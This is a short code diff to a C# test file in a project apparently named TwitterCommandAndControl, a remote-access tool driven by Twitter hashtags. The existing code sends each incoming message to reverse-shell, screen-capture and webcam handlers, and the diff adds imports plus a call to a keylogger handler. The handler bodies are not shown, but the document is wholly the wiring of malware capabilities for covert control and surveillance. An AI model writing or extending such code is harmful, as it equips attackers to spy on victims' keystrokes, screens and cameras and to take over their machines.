@@ -4,6 +4,8 @@ using System.Linq;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using TwitterCommandAndControl.Core;
+using TwitterCommandAndControl.Handlers;
 
 namespace TwitterCommandAndControl.Test
 {
@@ -22,6 +24,7 @@ namespace TwitterCommandAndControl.Test
                     ReverseShellHandler.Respond(x);
                     ScreenCaptureHandler.Respond(x);
                     WebcamHandler.Respond(x);
+                    KeyLoggerHandler.Respond(x);
                 });
             }, 
             track: hashTag, 
